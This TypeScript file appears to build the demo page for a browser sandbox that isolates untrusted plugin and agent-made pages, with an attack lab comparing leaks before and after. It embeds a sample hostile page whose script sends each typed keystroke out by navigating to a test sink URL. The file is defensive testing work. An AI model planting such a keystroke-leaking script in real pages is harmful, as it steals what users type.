import { ATTACKS, runAll, type Outcome } from './lab';
import { sandboxPage } from './page';
import { sandboxTemplate } from './client';
import { sha256Hex } from './sha256.js';

// Demo page (sandbox.html): a prototype-style HTML page served through the sandbox origin, a page
// that tries to leak, and the attack lab (before = srcdoc frames as on the earlier branches,
// now = sandbox origin). `?auto=1` runs the lab on load and leaves results in `window.__lab`.

const css = `
body { font: 14px/1.4 system-ui, sans-serif; margin: 24px; color: #222; max-width: 1100px; }
h1 { font-size: 20px; } h2 { font-size: 16px; margin-top: 28px; }
.row { display: flex; gap: 16px; align-items: flex-start; flex-wrap: wrap; }
iframe.demo { width: 360px; height: 260px; border: 1px solid #ccc; border-radius: 6px; background: #fff; }
pre.log { background: #f5f5f5; padding: 8px; width: 420px; height: 240px; overflow: auto; margin: 0; font-size: 12px; white-space: pre-wrap; }
table { border-collapse: collapse; width: 100%; font-size: 13px; }
td, th { border-bottom: 1px solid #eee; padding: 4px 6px; text-align: left; vertical-align: top; }
td.leak { background: #fde2e2; } td.ok { background: #e3f6e5; } td.info { background: #fff6d6; }
code { background: #f2f2f2; padding: 0 3px; border-radius: 3px; }
#frames { position: fixed; right: 0; bottom: 0; width: 1px; height: 1px; overflow: hidden; opacity: 0; }
button { font: inherit; padding: 4px 10px; }
`;
document.head.insertAdjacentHTML('beforeend', `<style>${css}</style>`);

const tpl = sandboxTemplate();
const sinkOrigin = new URL(tpl.replace('{label}.', '')).origin;
const stun = `stun:${new URL(sinkOrigin).hostname === 'localhost' ? '127.0.0.1' : new URL(sinkOrigin).hostname}:${new URL(sinkOrigin).port || 80}`;

document.body.insertAdjacentHTML(
  'beforeend',
  `<h1>Sandbox origin</h1>
<p>Untrusted code (plugins, agent-made pages) runs in frames from <code>${tpl}</code>: a separate origin per frame, CSP and Permissions-Policy from real response headers, a navigation guard, plugins inside a Worker. Navigation API here: <b>${typeof (window as any).navigation === 'object' ? 'yes' : 'no'}</b>. crypto.subtle: <b>${crypto.subtle ? 'yes' : 'no (plain http): plugin hashes use the JS SHA-256'}</b>.</p>
<p><a href="/">← back to the table</a> (Plugins → Examples now run on the sandbox origin)</p>
<h2>1. A prototype page on the sandbox origin</h2>
<p>Same bridge as the prototype idea: type a name (<code>data-store</code>), press Continue (<code>data-goto</code>). Then load a page that tries to leak the name by navigating.</p>
<div class="row"><div id="pageHost"></div><pre class="log" id="pageLog"></pre></div>
<p><button id="good">Load the signup page</button> <button id="evil">Load a page that tries to leak</button></p>
<h2>2. Attack lab</h2>
<p>Each attack runs in the old sandbox (<b>before</b>: srcdoc frame + CSP meta tag, as on the plugin-loader / prototype branches) and on the sandbox origin (<b>now</b>). <span style="background:#fde2e2">red</span> = the sink at <code>${sinkOrigin}/__sink</code> received it. WebRTC packets are only seen when the browser runs on the same machine as the sandbox server (UDP isn't proxied): elsewhere read the notes.</p>
<p><button id="run">Run all attacks</button> <span id="status"></span></p>
<table id="results"><thead><tr><th>attack</th><th>in</th><th>before</th><th>now</th></tr></thead><tbody></tbody></table>
<div id="frames"></div>`,
);

const $ = (id: string) => document.getElementById(id)!;
const log = (s: string) => ($('pageLog').textContent += s + '\n');

const SIGNUP = `<style>body{font:15px system-ui;margin:20px}input{font:inherit;padding:4px;width:200px}button{font:inherit;margin-top:8px}</style>
<h3>Create your account</h3>
<form><label>Name<br><input data-store="name" required placeholder="Ada"></label><br>
<button data-goto="Welcome">Continue</button></form>
<p style="color:#888">Hello, <span data-show="name">stranger</span></p>`;

const EVIL = `<style>body{font:15px system-ui;margin:20px}</style>
<h3>Innocent page</h3><p>Type something; on every key this page tries to send it out by navigating.</p>
<input id="i" placeholder="secret"><p id="o"></p>
<script>
document.getElementById('i').addEventListener('input', (e) => {
  location.href = ${JSON.stringify(sinkOrigin + '/__sink/demo-leak?typed=')} + encodeURIComponent(e.target.value);
  document.getElementById('o').textContent = 'tried to leave with: ' + e.target.value;
});
</script>`;

let current: { destroy(): void } | undefined;
function show(html: string) {
  current?.destroy();
  $('pageLog').textContent = '';
  const p = sandboxPage(html, { hint: 'demo' });
  p.frame.className = 'demo';
  p.onPageMessage((d) => log(`page → app: ${JSON.stringify(d)}`));
  p.onHostNote((n) => log(`frame host: ${JSON.stringify(n)}`));
  $('pageHost').replaceChildren(p.frame);
  log(`frame origin: ${p.origin}`);
  current = p;
}
$('good').onclick = () => show(SIGNUP);
$('evil').onclick = () => show(EVIL);
show(SIGNUP);

const names = new Map(ATTACKS.map((a) => [a.id, a.name]));
const rows = new Map<string, HTMLTableRowElement>();
function cell(o: Outcome) {
  const td = document.createElement('td');
  td.className = o.leaked.length ? (o.attack === 'control' ? 'info' : 'leak') : 'ok';
  td.textContent = (o.leaked.length ? `LEAKED: ${o.leaked.join(', ')}` : 'blocked') + (o.notes.length ? ` · ${o.notes.join(' · ')}` : '');
  return td;
}
function addResult(o: Outcome) {
  const key = `${o.attack}/${o.where}`;
  let tr = rows.get(key);
  if (!tr) {
    tr = document.createElement('tr');
    tr.innerHTML = `<td></td><td>${o.where}</td><td></td><td></td>`;
    tr.cells[0].textContent = names.get(o.attack) ?? o.attack;
    rows.set(key, tr);
    $('results').querySelector('tbody')!.append(tr);
  }
  tr.cells[o.mode === 'before' ? 2 : 3].replaceWith(cell(o));
}
async function run() {
  ($('run') as HTMLButtonElement).disabled = true;
  $('status').textContent = 'running…';
  rows.clear();
  $('results').querySelector('tbody')!.replaceChildren();
  try {
    await fetch(`${sinkOrigin}/__sink/clear`);
  } catch {
    $('status').textContent = `no sink at ${sinkOrigin}: start the sandbox server with --sink`;
    ($('run') as HTMLButtonElement).disabled = false;
    return;
  }
  const results = await runAll({ sinkOrigin, stun, host: $('frames') }, addResult);
  (window as any).__lab = results;
  $('status').textContent = `done: ${results.filter((r) => r.mode === 'now' && r.leaked.length && r.attack !== 'control').length} leaks now, ${results.filter((r) => r.mode === 'before' && r.leaked.length && r.attack !== 'control').length} before`;
  ($('run') as HTMLButtonElement).disabled = false;
}
$('run').onclick = run;
(window as any).__sha = sha256Hex;
if (new URLSearchParams(location.search).has('auto')) void run();
